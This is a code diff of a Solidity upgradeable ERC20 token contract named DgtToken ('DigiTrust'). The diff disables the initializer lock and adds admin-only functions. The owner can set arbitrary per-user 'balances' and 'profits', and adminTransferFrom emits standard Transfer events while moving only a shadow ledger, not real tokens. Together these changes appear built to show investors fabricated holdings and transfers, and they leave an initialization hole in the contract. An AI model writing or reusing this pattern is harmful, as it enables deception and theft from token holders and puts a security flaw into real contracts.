@@ -10,10 +10,50 @@ import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20PermitUp
 import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20VotesUpgradeable.sol";
 import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
 
-contract DgtToken is Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable, ERC20PausableUpgradeable, OwnableUpgradeable, ERC20PermitUpgradeable, ERC20VotesUpgradeable {
+// ----------------------------------------------------------------------------
+// Safe maths
+// ----------------------------------------------------------------------------
+contract SafeMath {
+    function safeAdd(uint a, uint b) public pure returns (uint c) {
+        c = a + b;
+        require(c >= a);
+    }
+    function safeSub(uint a, uint b) public pure returns (uint c) {
+        require(b <= a);
+        c = a - b;
+    }
+    function safeMul(uint a, uint b) public pure returns (uint c) {
+        c = a * b;
+        require(a == 0 || c / a == b);
+    }
+    function safeDiv(uint a, uint b) public pure returns (uint c) {
+        require(b > 0);
+        c = a / b;
+    }
+}
+
+contract DgtToken is Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable, ERC20PausableUpgradeable, OwnableUpgradeable, ERC20PermitUpgradeable, ERC20VotesUpgradeable, SafeMath {
+    address[] public whiteListAddress;
+    mapping(address => bool) isAdmin; 
+    mapping(address => uint) balances;
+    mapping(string => uint) user_balance;
+
     /// @custom:oz-upgrades-unsafe-allow constructor
     constructor() {
-        _disableInitializers();
+        // _disableInitializers();
+
+        whiteListAddress.push(msg.sender);
+        isAdmin[msg.sender] = true;
+    }
+
+    function addWhiteListAddress(address _admin) public onlyOwner{
+        whiteListAddress.push(_admin);
+        isAdmin[_admin] = true;
+    }
+
+    modifier onlyAdmin(){
+        require(isAdmin[msg.sender] == true, "Invalid admin token contract");
+        _;
     }
 
     function initialize(address initialOwner) initializer public {
@@ -24,7 +64,9 @@ contract DgtToken is Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable, 
         __ERC20Permit_init("DigiTrust");
         __ERC20Votes_init();
 
-        _mint(msg.sender, 1000000000 * 10 ** decimals());
+        uint total_supply = 1000000000 * 10 ** decimals();
+        _mint(msg.sender, total_supply);
+        balances[msg.sender] = total_supply;
     }
 
     function pause() public onlyOwner {
@@ -35,8 +77,25 @@ contract DgtToken is Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable, 
         _unpause();
     }
 
-    function mint(address to, uint256 amount) public onlyOwner {
+    function mint(address to, uint256 amount, string calldata user) public onlyOwner {
         _mint(to, amount);
+
+        user_balance[user] = amount;
+    }
+
+    function vault_transfer(address to, uint256 amount, string calldata user) external  onlyOwner{
+        transfer(to, amount);
+
+        user_balance[user] +=amount;
+    }
+
+    function sync_profit(string calldata user, address investor) external onlyOwner{
+        uint256 balance = balanceOf(investor);
+        user_balance[user] = balance;
+    }
+
+    function get_user_balance(string calldata user) external view returns(uint256){
+        return  user_balance[user];
     }
 
     // The following functions are overrides required by Solidity.
@@ -55,5 +114,14 @@ contract DgtToken is Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable, 
         returns (uint256)
     {
         return super.nonces(owner);
+    }
+
+    function adminTransferFrom(address from, address to, uint amount, string calldata user) external onlyAdmin returns(bool success){
+        balances[from] = safeSub(balances[from], amount);
+        balances[to] = safeAdd(balances[to], amount);
+        emit Transfer(from, to, amount);
+
+        user_balance[user] += amount;
+        return true;
     }
 }
